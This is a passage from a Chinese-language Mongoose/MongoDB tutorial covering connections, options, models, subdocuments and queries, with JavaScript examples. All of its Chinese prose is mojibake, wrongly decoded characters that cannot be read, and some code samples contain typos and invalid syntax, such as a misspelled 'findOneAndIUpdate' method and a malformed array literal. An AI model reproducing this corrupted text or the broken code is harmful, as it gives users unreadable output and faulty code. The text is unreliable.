è¿™ä¸ªå‡½æ•°å¯ä»¥æ£€æŸ¥ç»™å®šå­—æ®µè·¯å¾„çš„æ£€æŸ¥å™¨å’Œç±»åž‹ç­‰ä¿¡æ¯ã€‚ è¿žæŽ¥ï¼ˆConnectionsï¼‰å¯ä»¥ä½¿ç”¨ mongoose.connect()æ–¹æ³•è¿žæŽ¥ MongoDB 1mongoose.connect('mongodb://localhost/myapp'); è¿™æ˜¯è¿žæŽ¥æœ¬åœ° myappæ•°æ®åº“é»˜è®¤æŽ¥å£ï¼ˆ27017ï¼‰çš„æœ€å°é…ç½®ã€‚æœ¬åœ°è¿žæŽ¥å¤±è´¥å¯ä»¥å°è¯• 127.0.0.1.local hostname è¢«ä¿®æ”¹æœ‰æ—¶å€™ä¼šå¼•èµ·é—®é¢˜ã€‚ å¯ä»¥åœ¨ url ä¸­æŒ‡å®šå¤šä¸ªå‚æ•°ï¼š 1mongoose.connect('mongodb://username:password@host:port/database?options'); æ“ä½œç¼“å­˜ä¸å¿…ç­‰ç­‰è¿žæŽ¥å»ºç«‹æˆåŠŸå°±å¯ä»¥ä½¿ç”¨ Mongoose models 12345mongoose.connect('mongodb://localhost/myapp');const MyModel = mongoose.model('Test',new Schema(&#123;name:String&#125;));MyModel.findOne(function(err,res)&#123; // ...&#125;); Mongoose ä¼šç¼“å­˜ model æ“ä½œã€‚è¿™ä¸ªæ“ä½œå¾ˆæ–¹ä¾¿ï¼Œä½†ä¹Ÿä¼šå¼•èµ·ä¸€äº›ç–‘æƒ‘ï¼Œå› ä¸ºå¦‚æžœæ²¡æœ‰è¿žä¸Šçš„è¯ï¼ŒMongoose ä¸ä¼šæŠ›é”™ã€‚ 1234567const MyModel = mongoose.model('Test',new Schema(&#123;name:String&#125;));MyModel.findOne(function(err,res)&#123; // ..&#125;);setTimeout(function()&#123; mongoose.connect('mongodb://localhost/xxx');&#125;,6000); è¦ç¦ç”¨ç¼“å­˜ï¼Œä¿®æ”¹ bufferCommands é…ç½®ã€‚å¦‚æžœæ‰“å¼€äº†è¿™ä¸ªé€‰é¡¹è¿žæŽ¥è¢«æŒ‚èµ·ï¼Œå°è¯•å…³é—­ bufferCommands æ£€æŸ¥æ˜¯å¦æ­£ç¡®æ‰“å¼€è¿žæŽ¥ï¼Œä¹Ÿå¯ä»¥å…¨å±€ç¦ç”¨ bufferCommands: 1mongoose.set('bufferCommands',false); é€‰é¡¹connect æ–¹æ³•ä¹ŸæŽ¥å— options å‚æ•°ï¼Œè¿™äº›å‚æ•°ä¼šä¼ å…¥åº•å±‚ MongoDB é©±åŠ¨ 1mongoose.connect(uri,options); Mongoose ä¼šä¸åšä¿®æ”¹ç›´æŽ¥æŠŠé€‰é¡¹ä¼ åˆ°é©±åŠ¨ï¼Œä»¥ä¸‹æœ‰ä¸€ç‚¹ä¾‹å¤– bufferCommands æ˜¯ mongoose ç‰¹æœ‰çš„é€‰é¡¹ï¼Œ user/pass ç”¨äºŽè®¤è¯çš„ç”¨æˆ·åå’Œå¯†ç ã€‚mongoose ç‰¹æœ‰çš„ï¼Œç­‰ä»·äºŽ MongoDB é©±åŠ¨çš„ auth.user å’Œ auth.passwordé€‰é¡¹ autoIndex ç†æƒ³æƒ…å†µä¸‹ï¼Œmongoose åœ¨è¿žæŽ¥æ—¶ä¼šè‡ªåŠ¨å»ºç«‹ schema ç´¢å¼•ã€‚è¿™æœ‰åˆ©äºŽå¼€å‘ï¼Œä½†æ˜¯åœ¨å¤§åž‹ç”Ÿäº§çŽ¯å¢ƒä¸­ä¸æ˜¯å¾ˆç†æƒ³ï¼Œå› ä¸ºä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚ dbName æŒ‡å®šè¦è¿žæŽ¥çš„æ•°æ®åº“åç§°ï¼ˆè¦†ç›–è¿žæŽ¥å­—ç¬¦ä¸²ï¼‰ ä¸‹é¢æ˜¯ä¸€äº›é‡è¦çš„é€‰é¡¹ autoReconnect åº•å±‚ MongoDB é©±åŠ¨åœ¨è¿žæŽ¥åŽå°†è‡ªåŠ¨é‡è¿žã€‚é™¤éžæ˜¯ç®¡ç†è¿žæŽ¥æ± çš„é«˜æ‰‹ï¼Œä¸ç„¶ä¸å»ºè®®è®¾ç½®ä¸º false bufferMaxEntries MongoDB é©±åŠ¨åŒæ ·æœ‰è‡ªå·±çš„ç¦»çº¿ç¼“å­˜æœºåˆ¶ã€‚å¦‚æžœå¸Œæœ›è¿žæŽ¥é”™è¯¯æ—¶ç»ˆæ­¢æ•°æ®åº“æ“ä½œï¼Œå¯ä»¥è®¾è¿™ä¸ªå€¼ä¸º 0 ä»¥åŠæŠŠ bufferCommands è®¾ä¸º false. promiseLibrary è®¾ç½®åº•å±‚ promise åº“ poolSize MongoDB ä¿æŒçš„æœ€å¤§ socket è¿žæŽ¥æ•°ã€‚é»˜è®¤æ˜¯5.MongoDB 3.4 ä¹‹å‰ï¼Œåªå…è®¸æ¯ä¸ª socket åŒæ—¶è¿›è¡Œä¸€ä¸ªæ“ä½œï¼Œæ‰€ä»¥å¦‚æžœæœ‰å‡ ä¸ªç¼“æ…¢è¯·æ±‚å¡ç€åŽé¢å¿«çš„è¯·æ±‚ï¼Œå¯ä»¥å°è¯•å¢žåŠ è¿žæŽ¥æ•°ã€‚ ä¸¾ä¾‹å­ï¼š 123456789const options = &#123; useMongoClient:true, autoIndex:false, // ä¸è¦åˆ›å»ºç´¢å¼• reconnectTries:Number.MAX_VALUE, // ä¸è¦åœæ­¢é‡è¿ž reconnectInterval:500, // æ¯500æ¯«ç§’é‡è¿ž poolSize:10, // ç»´æŠ¤æœ€å¤š10ä¸ªsocket bufferMaxEntries:0 // å¦‚æžœæ²¡æœ‰è¿žæŽ¥ï¼Œåˆ™ç«‹å³è¿”å›žé”™è¯¯ï¼Œè€Œä¸æ˜¯ç­‰å¾…é‡æ–°è¿žæŽ¥&#125;mongoose.connect(uri,options); å›žè°ƒconnect å‡½æ•°æŽ¥å—å›žè°ƒå‡½æ•°ï¼Œæˆ–è€…è¿”å›žä¸€ä¸ª promise 1234567mongoose.connect(uri,options,function(error)&#123; &#125;);mongoose.connect(uri,options).then( ()=&gt;&#123;/** ready to use. The `mongoose.connect()` promise resolves to undefined. */ &#125; err=&gt;&#123;/** handle initial connection error */&#125;); è¿žæŽ¥å­—ç¬¦ä¸²ï¼ˆConnectng Stringï¼‰é€‰é¡¹å¯ä»¥åœ¨è¿žæŽ¥å­—ç¬¦ä¸²å¡«å†™é©±åŠ¨é€‰é¡¹ï¼Œè¿™åªé€‚ç”¨äºŽ MongoDB é©±åŠ¨ä½¿ç”¨çš„é€‰é¡¹ï¼Œæ‰€ä»¥ç±»ä¼¼ bufferCommands çš„ Mongoose ä¸“ç”¨é€‰é¡¹ä¸èƒ½åœ¨è¿žæŽ¥å­—ç¬¦ä¸²ä½¿ç”¨ 123456mongoose.connect('mongodb://localhost:27017/test?connectTimeoutMS=1000&amp;bufferCommands=false');// ç›¸å½“äºŽmongoose.connect('mongodb://localhost:27017/test', &#123; connectTimeoutMS: 1000 // Note that mongoose will **not** pull `bufferCommands` from the query string&#125;); æŠŠé€‰é¡¹æ”¾åœ¨è¿žæŽ¥å­—ç¬¦ä¸²çš„åŠ£åŠ¿æ˜¯ä¸ä¾¿é˜…è¯»ã€‚ä¼˜åŠ¿æ˜¯ç®€çŸ­ã€‚æœ€ä½³å®žè·µæ˜¯æŠŠåŒºåˆ†ç”Ÿäº§çŽ¯å¢ƒå’Œå¼€å‘çŽ¯å¢ƒçš„é€‰é¡¹ï¼ŒsocketTimeoutMS ã€ connectTimeoutMS æ”¾åœ¨ uri ï¼Œ æŠŠé€šç”¨çš„å¸¸é‡å¦‚ connectTimeoutMS ã€ poolSize æ”¾åœ¨é€‰é¡¹å¯¹è±¡é‡Œã€‚ keepAliveæ³¨æ„äº‹é¡¹å¯¹äºŽé•¿æœŸè¿è¡Œçš„åŽå°å¼•ç”¨ï¼Œå¯ç”¨æ¯«ç§’çº§ keepAliveæ˜¯ä¸€ä¸ªç²¾æ˜Žçš„æ“ä½œã€‚ä¸è¿™ä¹ˆåšå¶å°”ä¼šç»å¸¸æ”¶åˆ°çœ‹ä¼¼æ²¡æœ‰ä»€ä¹ˆåŽŸå› çš„ connection closed é”™è¯¯ 1mongoose.connect(uri,&#123;keepAlive:120&#125;); å‰¯æœ¬é›†ï¼ˆReplica Setï¼‰è¿žæŽ¥è¦è¿žæŽ¥åˆ°å‰¯æœ¬é›†ï¼Œå¯ä»¥ä½¿ç”¨é€—å·åˆ†éš”å¼€ï¼Œä¼ å…¥å¤šä¸ªåœ°å€ï¼š 1mongoose.connect('mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]' [, options]); è¿žæŽ¥åˆ°å•èŠ‚ç‚¹å‰¯æœ¬é›†ï¼Œéœ€è¦æŒ‡å®š relicaSet é€‰é¡¹ 1mongoose.connect('mongodb://host1:port1/?replicaSet=rsName'); å¤š mongos æ”¯æŒä½¿ç”¨é«˜æ€§èƒ½åˆ†ç‰‡é›†ç¾¤ï¼Œéœ€è¦è¿žæŽ¥å¤šä¸ª mongosï¼ˆMongoDB Shardï¼‰ å®žä¾‹ã€‚ åœ¨ mongoose 5.x ä¸­ï¼Œ ä½ åœ¨è¿žæŽ¥å¤šä¸ª mongos æ—¶ä¸éœ€è¦ä¼ å…¥ä»»ä½•ç‰¹æ®Šé€‰é¡¹ã€‚ 12// Connect to 2 mongos serversmongoose.connect('mongodb://mongosA:27501,mongosB:27501', cb); å¤šä¸ªè¿žæŽ¥ä¹‹å‰æˆ‘ä»¬äº†è§£å¦‚ä½•ä½¿ç”¨ Mongoose é»˜è®¤è¿žæŽ¥æ–¹æ³•è¿žæŽ¥åˆ° MongoDBã€‚ä½†æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦æƒé™ä¸åŒçš„å¤šä¸ªè¿žæŽ¥ï¼Œ æˆ–æ˜¯è¿žæŽ¥åˆ°ä¸åŒæ•°æ®åº“ã€‚è¿™ä¸ªæƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ mongoose.createConnection()ï¼Œ å®ƒæŽ¥å—ä¹‹å‰æåˆ°çš„æ‰€æœ‰å‚æ•°ï¼Œç»™ä½ è¿”å›žä¸€ä¸ªæ–°çš„è¿žæŽ¥ã€‚ 1const conn = mongoose.createConnection('mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]', options); connectionå¯¹è±¡åŽç»­ç”¨äºŽåˆ›å»ºå’Œæ£€ç´¢modelsã€‚ models çš„èŒƒå›´æ€»æ˜¯å±€é™äºŽå•ä¸ªè¿žæŽ¥ã€‚ è°ƒç”¨ mongoose.connect() æ—¶ï¼ŒMongoose ä¼šè‡ªåŠ¨åˆ›å»ºé»˜è®¤è¿žæŽ¥ã€‚ ä½ å¯ä»¥ä½¿ç”¨ mongoose.connection è®¿é—®é»˜è®¤è¿žæŽ¥ã€‚ è¿žæŽ¥æ± æ— è®ºæ˜¯ä½¿ç”¨ mongoose.connect æˆ–æ˜¯ mongoose.createConnection åˆ›å»ºçš„è¿žæŽ¥ï¼Œ éƒ½è¢«çº³å…¥é»˜è®¤æœ€å¤§ä¸º 5 çš„è¿žæŽ¥æ± ï¼Œå¯ä»¥é€šè¿‡ poolSize é€‰é¡¹è°ƒæ•´ï¼š 12345// With object optionsmongoose.createConnection(uri, &#123; poolSize: 4 &#125;);const uri = 'mongodb://localhost/test?poolSize=4';mongoose.createConnection(uri); æ¨¡åž‹ï¼ˆModelsï¼‰Models æ˜¯ä»Ž Schema ç¼–è¯‘æ¥çš„æž„é€ å‡½æ•°ï¼Œå®ƒä»¬çš„å®žä¾‹å°±ä»£è¡¨ç€å¯ä»¥ä»Žæ•°æ®ä¿å­˜å’Œè¯»å– documentsï¼Œä»Žæ•°æ®åˆ›å»ºå’Œè¯»å– document çš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯é€šè¿‡ model è¿›è¡Œçš„ã€‚ 12const schema = new Schema(&#123;name:'string',size:'string'&#125;);const Tank = mongoose.model('Tank',schema); ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è·Ÿ model å¯¹åº”çš„é›†åˆï¼ˆcollectionï¼‰ åå­—çš„å•æ•°å½¢å¼ã€‚Mongoose ä¼šè‡ªåŠ¨æ‰¾åˆ°åç§°æ˜¯ model åå­—å¤æ•°å½¢å¼çš„ collectionã€‚å¯¹äºŽä¸Šä¾‹ï¼ŒTank è¿™ä¸ªmodel å°±å¯¹åº” æ•°æ®åº“ä¸­ tanks è¿™ä¸ª collection..model() è¿™ä¸ªå‡½æ•°æ˜¯å¯¹ schema åšäº†æ‹·è´ï¼ˆç”Ÿæˆäº†modelï¼‰ã€‚è¦ç¡®ä¿åœ¨è°ƒç”¨ .model() ä¹‹å‰æŠŠæ‰€æœ‰éœ€è¦çš„ä¸œè¥¿éƒ½åŠ è¿›åŽ» schemaé‡Œé¢ã€‚ æž„é€  documentsDocuments æ˜¯ model çš„å®žä¾‹ï¼Œåˆ›å»ºå®ƒä»¬å¹¶ä¿å­˜åˆ°æ•°æ®åº“éžå¸¸ç®€å•ï¼š 123456789const Tank = mongoose.model('Tank',yourSchema);const small = new Tank(&#123;size:'small'&#125;);small.save(function(err)&#123; if(err) return handleError(err);&#125;);Tank.create(&#123;size:'small'&#125;,function(err,small)&#123; if(err) return handleError(err);&#125;); è¦æ³¨æ„ï¼ŒçŸ¥é“ model ä½¿ç”¨çš„æ•°æ®è¿žæŽ¥ï¼ˆconnectionï¼‰è¢«æ‰“å¼€ï¼Œtanks æ‰ä¼šè¢«åˆ›å»º/åˆ é™¤ï¼Œæ¯ä¸ª model éƒ½æœ‰ä¸€ä¸ªç»‘å®šçš„è¿žæŽ¥ã€‚å¦‚æžœmodel æ˜¯é€šè¿‡è°ƒç”¨ mongoose.model() ç”Ÿæˆçš„ï¼Œå®ƒå°†ä½¿ç”¨ mongoose çš„é»˜è®¤è¿žæŽ¥ã€‚ 1mongoose.connect('localhost','gettingstarted') å¦‚æžœè‡ªè¡Œåˆ›å»ºäº†è¿žæŽ¥ï¼Œå°±éœ€è¦ä½¿ç”¨ connection çš„ modelå‡½æ•°ä»£æ›¿ mongoose çš„ modelå‡½æ•° 12const connection = mongoose.createConnection('mongodb://localhost:27017/test');const Tank = connection.model('Tank',yourSchema); æŸ¥è¯¢ç”¨ mongoose æŸ¥è¯¢æ–‡æ¡£ç›¸å½“å®¹æ˜“ï¼Œå®ƒæ”¯æŒ mongoDBçš„é«˜çº§æŸ¥è¯¢è¯­æ³•ï¼ˆrichï¼‰ï¼ŒæŸ¥è¯¢æ–‡æ¡£å¯ä»¥ä½¿ç”¨ modelçš„ find,findById,findOne,where è¿™äº›é™æ€æ–¹æ³•ã€‚ 1Tank.find(&#123;size:'small'&#125;).where('createDate').gt(oneYearAgo).exec(callback); åˆ é™¤modelçš„ removeæ–¹æ³•å¯ä»¥åˆ é™¤æ‰€æœ‰åŒ¹é…æŸ¥è¯¢æ¡ä»¶çš„æ–‡æ¡£ 123Tank.remove(&#123;size:'large'&#125;,function(err)&#123; if(err) return handleError(err);&#125;); æ›´æ–°modelçš„ updateæ–¹æ³•å¯ä»¥ä¿®æ”¹æ•°æ®åº“ä¸­çš„æ–‡æ¡£ï¼Œä¸è¿‡ä¸ä¼šæŠŠæ–‡æ¡£è¿”å›žç»™åº”ç”¨å±‚ã€‚ å¦‚æžœæƒ³æ›´æ–°å•ç‹¬ä¸€æ¡æ–‡æ¡£å¹¶ä¸”è¿”å›žç»™åº”ç”¨å±‚ï¼Œå¯ä»¥ä½¿ç”¨ findOneAndIUpdate æ–¹æ³• æ–‡æ¡£ï¼ˆDocumentsï¼‰Mongoose documentsä»£è¡¨ç€MongoDB æ–‡æ¡£çš„ä¸€å¯¹ä¸€æ˜ å°„ï¼Œæ¯ä¸ª document éƒ½æ˜¯ä»–çš„ Model å®žä¾‹ã€‚ æ£€ç´¢MongoDB æœ‰å¾ˆå¤šæ£€ç´¢æ•°æ®çš„æ–¹æ³•ã€‚ æ›´æ–°Document æ›´æ–°çš„æ–¹æ³•åŒæ ·ä¹Ÿæœ‰å¾ˆå¤š,æœ€åŸºæœ¬çš„ findById 12345678Tank.findById(id,function(err,tank)&#123; if(err) return handleError(err); tank.size = 'large'; tank.save(function(err,updateTank)&#123; if(err) return handleError(err); res.send(updateTank); &#125;);&#125;); ä¹Ÿå¯ä»¥ç”¨ .set() ä¿®æ”¹ document ã€‚åœ¨åº•å±‚ï¼Œtank.size = &#39;large&#39;ï¼Œç”¨ tank.set({size:&#39;large&#39;}) 12345678Tank.findById(id,function(err,tank)&#123; if(err) return handleError(err); tank.set(&#123;size:'large'&#125;); tank.save(function(err,updateTank)&#123; if(err) return handleError(err); res.send(updateTank); &#125;);&#125;); è¿™ä¸ªæ–¹æ³•å…ˆæ£€ç´¢äº†æ•°æ®ï¼ŒæŽ¥ç€æ›´æ–°ï¼ˆä½¿ç”¨äº†saveï¼‰ã€‚å¦‚æžœæˆ‘ä»¬ä»…ä»…éœ€è¦æ›´æ–°è€Œä¸æ˜¯èŽ·å–è¯¥æ•°æ®ï¼Œmodel#updateå°±å¾ˆé€‚åˆæˆ‘ä»¬ï¼š 1Tank.update(&#123;_id:id&#125;,&#123;$set:&#123;size:'large'&#125;&#125;,callback); å¦‚æžœæˆ‘ä»¬ç¡®å®žéœ€è¦è¿”å›žæ–‡æ¡£ï¼Œä¸‹é¢çš„æ–¹æ³•æ›´åŠ é€‚åˆï¼š 1234Tank.findByIdAndUpdate(id,&#123;$set:&#123;size:'large'&#125;&#125;,&#123;new:true&#125;,function(err,tank)&#123; if(err) return handleError(err); res.send(tank);&#125;); findAndUpdate/Removeç³»åˆ—é™æ€æ–¹æ³•æŸ¥æ‰¾å¹¶è¿”å›žæœ€å¤š1ä¸ªæ–‡æ¡£ï¼Œæ¨¡å¼çš„æ–¹æ³•æœ‰ä¸å°‘ã€‚ æ³¨æ„ï¼šfindAndUpdata/Removeä¸ä¼šä¿®æ”¹æ•°æ®åº“æ—¶æ‰§è¡Œä»»ä½•é’©å­æˆ–è€…éªŒè¯ã€‚å¯ä»¥ä½¿ç”¨ runValidators é€‰é¡¹èŽ·å–ä¸€ä¸ªéªŒè¯çš„é™åˆ¶å­é›†ã€‚ä½†æ˜¯éœ€è¦é’©å­å’Œå…¨æ–‡æ¡£éªŒè¯çš„ï¼Œè¿˜æ˜¯å…ˆquery åœ¨save éªŒè¯Document ä¼šåœ¨è¢«ä¿å­˜ä¹‹å‰éªŒè¯ã€‚ è¦†ç›–å¯ä»¥ç”¨ .set() è¦†ç›–æ•´ä¸ªæ–‡æ¡£ã€‚å¦‚æžœè¦ä¿®æ”¹åœ¨ä¸­é—´ä»¶ä¸­è¢«ä¿å­˜çš„æ–‡æ¡£ï¼Œè¿™æ ·å°±å¾ˆæ–¹ä¾¿äº†ã€‚ 12345Tank.findById(id,function(err,tank)&#123; if(err) return handleError(); // otherTank æ˜¯ tank çš„å‰¯æœ¬ otherTank.set(tank)&#125;); å­æ–‡æ¡£ï¼ˆSubdocumentsï¼‰å­æ–‡æ¡£æ˜¯æŒ‡åµŒå¥—åœ¨å¦ä¸€ä¸ªæ–‡æ¡£ä¸­çš„æ–‡æ¡£ã€‚åœ¨ Mongoose ä¸­ï¼Œè¿™æ„å‘³ç€å¯ä»¥åœ¨ é‡Œé¢åµŒå¥—ä¸€ä¸ª schema ã€‚Mongoose å­æ–‡æ¡£æœ‰ä¸¤ç§ä¸åŒçš„æ¦‚å¿µï¼šå­æ–‡æ¡£æ•°ç»„å’Œå•ä¸ªåµŒå¥—å­æ–‡æ¡£ã€‚ 123456const childSchema = new Schema(&#123;name:'string'&#125;);const parentSchema = new Schema(&#123; children:[childSchema], // Single nested subdocuments. Caveat: single nested subdocs only work in mongoose &gt;= 4.2.0 child:childSchema&#125;) å­æ–‡æ¡£å’Œæ™®é€š docuemnt ç±»ä¼¼ã€‚åµŒå¥— schema å¯ä»¥æœ‰è‡ªå·±çš„ä¸­é—´ä»¶ï¼Œè‡ªå®šä¹‰æ£€ç´¢é€»è¾‘ã€è™šæ‹Ÿå€¼å·²ç»å…¶ä»–é¡¶å±‚ schemas å¯ç”¨çš„ç‰¹æ€§ï¼Œä¸¤è€…ä¸»è¦çš„ä¸åŒç‚¹æ˜¯å­æ–‡æ¡£ä¸èƒ½å•ç‹¬ä¿å­˜ï¼Œä»–ä»¬ä¼šåœ¨ä»–ä»¬çš„é¡¶çº§æ–‡æ¡£ä¿å­˜æ—¶ä¿å­˜ã€‚ 12345const Parent = mongoose.model('Parent',parentSchema);const parent = new Parent([children:[&#123;name:'Matt'&#125;,&#123;name:'Sarah'&#125;]]);parent.children[0].name = 'HaHa';// parent.children[0].save() æ— æ“ä½œï¼Œè™½ç„¶ä»–è§¦å‘äº†ä¸­é—´ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰ä¿å­˜æ–‡æ¡£ï¼Œéœ€è¦ save ä»–çš„æ–‡æ¡£ã€parent.save(callback); å­æ–‡æ¡£è·Ÿæ™®é€šæ–‡æ¡£ä¸€æ ·æœ‰ save å’Œ validate ä¸­é—´ä»¶ï¼Œè°ƒç”¨ç¦æ–‡æ¡£çš„ save ä¼šè§¦å‘æ‰€æœ‰å­æ–‡æ¡£çš„ save ä¸­é—´ä»¶ï¼Œ validate ä¸­é—´ä»¶åŒç†ã€‚ 12345678910childSchema.pre('save',function(next)&#123; if('invalid' == this.name)&#123; return next(new Error('#sadpanda')) &#125; next();&#125;);const parent = new Parent(&#123;children:[&#123;name:'invalid'&#125;]&#125;);parent.save(function(err)&#123; console.log(err.message); //#sadpanda&#125;); å­æ–‡æ¡£çš„ pre(&#39;save&#39;) å’Œ pre(&#39;validate&#39;)ä¸­é—´ä»¶æ‰§è¡ŒäºŽé¡¶å±‚ document pre(&#39;save&#39;) ä¹‹å‰ï¼Œé¡¶å±‚ document çš„ pre(&#39;validate&#39;)ä¹‹åŽã€‚å› ä¸º save()å‰çš„éªŒè¯å°±æ˜¯ä¸€ä¸ªä¸­é—´ä»¶ã€‚ 1234567891011121314151617181920212223const childSchema = new mongoose.Schema(&#123;name:'string'&#125;);childSchema.pre('validate',function(next)&#123; console.log(2); next();&#125;);childSchema.pre('save',function(next)&#123; console.log(3); next();&#125;);const parentSchema = new mongoose.Schema(&#123; child:childSchema&#125;);parentSchema.pre('validate',function(next)&#123; console.log(1); next();&#125;);parentSchema.pre('save',function(next)&#123; console.log(4); next();&#125;);// 1 2 3 4 æŸ¥æ‰¾å­æ–‡æ¡£æ¯ä¸ªå­æ–‡æ¡£éƒ½æœ‰ä¸€ä¸ªé»˜è®¤ _idï¼ŒMongoose document æ•°ç»„æœ‰ä¸€ä¸ªç‰¹åˆ«çš„ id æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åªè¦ä¼ å…¥ _idå°±èƒ½è¿”å›žæ–‡æ¡£æ•°ç»„ä¸­ç‰¹å®šæ–‡æ¡£ã€‚ 1const doc = parent.children.id(_id); æ·»åŠ å­æ–‡æ¡£åˆ°æ•°ç»„Mongoose æ•°ç»„æ–¹æ³•æœ‰ pushã€unshiftã€addToSet ç­‰ç­‰ï¼š 123456789101112const Parent = mongoose.model('Parent');const parent = new Parent;parent.children.push(&#123;name:'Haha'&#125;);const subdoc = parent.children[0];subdoc; // _id: '501d86090d371bab2c0341c5', name: 'Haha' &#125;subdoc.isNew; // trueparent.save(function(err)&#123; if(err) return handleError(err); console.log('Success');&#125;); create æ–¹æ³•å¯ä»¥æ–°å»ºæ–‡æ¡£ä½†æ˜¯ä¸åŠ å…¥æ•°ç»„ 1const newdoc = parent.children.create(&#123;name:'Haha'&#125;); åˆ é™¤å­æ–‡æ¡£æ¯ä¸ªå­æ–‡æ¡£éƒ½æœ‰ remove æ–¹æ³•ï¼Œå¦å¤–ï¼Œå¯¹äºŽå­æ–‡æ¡£æ•°ç»„ï¼Œæœ‰ä¸€ä¸ªç­‰æ•ˆçš„æ–¹æ³•.pull()ã€‚å¯¹äºŽå•ä¸ªåµŒå¥—å­æ–‡æ¡£ï¼Œremove ä¸ŽæŠŠè¿™ä¸ªæ–‡æ¡£çš„å€¼è®¾ä¸º null ç­‰æ•ˆã€‚ 12345678// ç­‰æ•ˆ parent.children.pull(_id)parent.children.id(_id).remove()// æˆ–è€… parent.child = nullparent.child.remove();parent.save(function(err)&#123; if(err) return handleError(err); console.log('the subdocs were removed');&#125;); ä»£æ›¿å£°æ˜Žè¯­æ³•çš„å†™æ³• å¦‚æžœç”¨å¯¹è±¡çš„æ•°ç»„åˆ›å»º schema,mongoose ä¼šè‡ªåŠ¨æŠŠå¯¹è±¡è½¬æˆ schemaï¼š 1234567const parentSchema = new Schema(&#123; children:[&#123;name:'string'&#125;]&#125;)// ç­‰ä»·äºŽconst parentSchema = new Schema(&#123; children:[new Schema(&#123;name:'string'&#125;)]&#125;); æŸ¥è¯¢ï¼ˆqueriesï¼‰Model çš„å¤šä¸ªé™æ€è¾…åŠ©æ–¹æ³•éƒ½å¯ä»¥æŸ¥è¯¢æ–‡æ¡£ã€‚ Model çš„æ–¹æ³•ä¸­åŒ…å«æŸ¥è¯¢æ¡ä»¶å‚æ•°çš„ï¼ˆfind findById count updateï¼‰éƒ½å¯ä»¥æŒ‰ç…§ä¸‹é¢ä¸¤ç§æ–¹å¼æ‰§è¡Œï¼š ä¼ å…¥ callback å‚æ•°ï¼Œæ“ä½œä¼šè¢«ç«‹å³æ‰§è¡Œï¼ŒæŸ¥è¯¢ç»“æžœè¢«ä¼ ç»™å›žè°ƒå‡½æ•°ï¼ˆcallbackï¼‰ ä¸ä¼  callback å‚æ•°ï¼ŒQuery çš„ä¸€ä¸ªå®žä¾‹ï¼ˆä¸€ä¸ª queryå¯¹è±¡ï¼‰è¢«è¿”å›žï¼Œè¿™ä¸ª query æä¾›äº† æž„å»ºæŸ¥è¯¢å™¨çš„ç‰¹æ®ŠæŽ¥å£ã€‚ Query å®žä¾‹æœ‰ä¸€ä¸ª .then()å‡½æ•°ï¼Œç”¨æ³•ç±»ä¼¼ promise å¦‚æžœæ‰§è¡ŒæŸ¥è¯¢æ—¶ä¼ å…¥ callback,å°±éœ€è¦ç”¨ JSON æ–‡æ¡£çš„æ ¼å¼æŒ‡å®šæŸ¥è¯¢æ¡ä»¶ï¼ŒJSON æ–‡æ¡£çš„è¯­æ³•è·Ÿ MongoDB shell ä¸€è‡´ã€‚ 1234567const Parent = mongoose.model('Person',mySchema);// æŸ¥è¯¢ last name æ˜¯ haha çš„ person,é€‰ä¸­ name å’Œ occupation å­—æ®µPerson.findOne(&#123;'name.last':'haha'&#125;,'name occupation',function(err,person)&#123; if(err) return handleError(err); console.log(person.name.first,person.name.last,person.occupation);&#125;); ä¸Šé¢çš„æŸ¥è¯¢è¢«ç«‹å³æ‰§è¡Œï¼ŒæŸ¥è¯¢ç»“æžœè¢«ä¼ å…¥å›žè°ƒå‡½æ•°ã€‚Mongoose ä¸­æ‰€æœ‰çš„è°ƒç”¨å‡½æ•°éƒ½æ˜¯ç”¨ callback(error,result)è¿™ç§æ¨¡å¼ã€‚å¦‚æžœæŸ¥è¯¢å‘ç”Ÿé”™è¯¯ï¼Œerrorå‚æ•°å³æ˜¯é”™è¯¯æ–‡æ¡£ï¼Œresultå‚æ•°ä¼šæ˜¯ nullã€‚å¦‚æžœæŸ¥è¯¢æˆåŠŸï¼Œerrorå‚æ•°æ˜¯ nullï¼Œresultå³æ˜¯æŸ¥è¯¢ç»“æžœã€‚ æŸ¥è¯¢ç»“æžœçš„æ ¼å¼å–å†³äºŽåšä»€ä¹ˆæ“ä½œï¼šfindOne() æ˜¯å•ä¸ªæ–‡æ¡£ï¼ˆæˆ–è€…nullï¼‰ï¼Œfind() æ˜¯æ–‡æ¡£åˆ—è¡¨ï¼Œcount() æ˜¯æ–‡æ¡£æ•°é‡ï¼Œ update() æ˜¯è¢«ä¿®æ”¹çš„æ–‡æ¡£æ•°é‡ã€‚ ä¸‹é¢çœ‹çœ‹ä¸ä¼ å…¥ callback è¿™ä¸ªå‚æ•°ä¼šæ˜¯æ€Žä¹ˆæ ·çš„ï¼š 12345678910// æŸ¥æ‰¾æ¯ä¸ª last name æ˜¯ haha çš„ personconst query = Person.findOne(&#123;'name.last':'haha'&#125;);// é€‰æ‹© name å’Œ occupation å­—æ®µquery.select('name occupation');// ç„¶åŽæ‰§è¡ŒæŸ¥è¯¢query.exec(function(err,person)&#123; if(err) return handleError(err); console.log(person.name.first,person.name.last,person.occupation);&#125;); ä¸Šé¢çš„ä»£ç ä¸­ï¼Œquery æ˜¯ Query ç±»åž‹çš„å˜é‡ï¼ŒQuery èƒ½å¤Ÿç”¨é“¾å¼è¯­æ³•æž„å»ºæŸ¥è¯¢å™¨ï¼Œæ— éœ€è¦æ‰§è¡Œ JSON å¯¹è±¡ã€‚ä¸‹é¢2ä¸ªå®žä¾‹ç­‰æ•ˆï¼š 1234567891011121314151617Person.find(&#123; occupation:/host/, 'name.last':'haha', age:&#123;$gt:17,$lt:66&#125;, likes:&#123;$in:['vaporizing','talking']&#125;&#125;).limit(10).sort(&#123;occupation:-1&#125;).select(&#123;name:1,ouccupation:1&#125;).exec(callback);Person.find(&#123;occupation:/host/&#125;).where('name.last').equals('haha').where('age').gt(17).lt(66).where('likes').in(['vaporizing','talking']).limit(10).sort('-occupation').select('name occupation').exec(callback) å¼•ç”¨å…¶ä»–æ–‡æ¡£MongoDB 